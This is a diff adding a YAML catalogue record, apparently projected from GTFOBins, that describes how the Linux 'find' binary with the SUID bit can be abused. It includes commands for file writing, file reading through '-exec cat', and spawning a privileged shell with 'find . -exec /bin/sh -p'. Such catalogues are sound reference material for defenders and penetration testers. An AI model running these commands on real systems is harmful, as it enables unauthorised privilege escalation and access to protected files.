@@ -1,0 +1,95 @@
+id: gtfobins/find/file-write/suid
+type: binary
+platform: linux
+name: find
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: find / -fprintf /path/to/output-file DATA -quit
+  comment: '`DATA` is a format string, it supports some escape sequences.'
+references:
+- https://gtfobins.github.io/gtfobins/find/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        find:
+          functions:
+            file-read:
+            - code: find /path/to/input-file -exec cat {} \;
+              comment: This uses `cat` to actually read the file, but since permissions are not dropped,
+                it's executed with the same privileges as `find`.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: find / -fprintf /path/to/output-file DATA -quit
+              comment: '`DATA` is a format string, it supports some escape sequences.'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: find . -exec /bin/sh \; -quit
+              contexts:
+                sudo: null
+                suid:
+                  code: find . -exec /bin/sh -p \; -quit
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/find/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-write
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:d8217a1312dec5dfbb1d79a70a04d8c77caebc7e4937d2ebbc48ddddb363c54b
